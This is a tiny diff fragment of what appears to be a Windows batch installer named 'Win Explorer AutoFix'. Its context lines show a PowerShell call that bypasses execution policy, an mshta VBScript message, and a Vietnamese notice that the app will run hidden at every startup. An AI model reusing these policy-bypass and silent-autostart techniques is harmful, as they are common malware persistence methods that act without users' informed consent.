@@ -21,3 +21,4 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command "$ws = New-Object -ComObj
 mshta vbscript:Execute("msgbox ""Cai dat thanh cong! Ung dung se tu dong chay ngam moi khi may khoi dong."", 64, ""Win Explorer AutoFix"":close")
 
 exit
+
